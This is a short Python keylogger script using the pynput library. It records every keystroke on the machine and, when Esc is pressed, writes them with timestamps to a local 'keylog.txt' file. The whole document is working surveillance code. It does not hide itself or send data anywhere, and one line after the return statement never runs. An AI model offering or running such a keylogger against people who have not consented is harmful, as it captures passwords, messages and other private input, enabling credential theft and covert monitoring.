from pynput import keyboard
from datetime import datetime
 
 #Global Variable to store keystrokes
keystrokes=[]

# Function to log keystrokes to a file    
def file(keys):
    with open("keylog.txt","a")as log:   
            for key in keys:               # Write each keystroke with a timestamp
                log.write(f'{datetime.now()} | {key}\n') 
    print("Logged",keys)

# Function to handle key press events
def key_press(key):
        try:
            keystrokes.append(key.char)
        except AttributeError:
            keystrokes.append(str(key))    

# Function to handle key release events
def key_release(key):
        if key==keyboard.Key.esc:
            file(keystrokes)
            return False
            keystrokes.clear()
# Setting up the listener to capture keystrokes
with keyboard.Listener(on_press=key_press,on_release=key_release)as listener:
    print("Runnning")
    listener.join()